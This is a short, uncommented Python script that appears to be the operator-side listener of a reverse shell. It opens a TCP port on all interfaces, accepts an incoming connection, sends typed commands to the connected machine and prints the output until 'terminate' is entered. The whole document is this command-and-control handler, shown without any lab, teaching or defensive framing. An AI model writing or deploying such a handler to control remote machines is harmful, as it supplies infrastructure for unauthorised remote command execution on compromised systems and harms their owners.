import socket

def listen(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"Listening on port {port}...")
    conn, addr = s.accept()
    print(f"Connection from {addr}")
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        if 'terminate' in command:
            conn.close()
            break
        else:
            print(conn.recv(1024).decode())

def main():
    port = int(input("Enter listener port: "))
    listen(port)

if __name__ == "__main__":
    main()
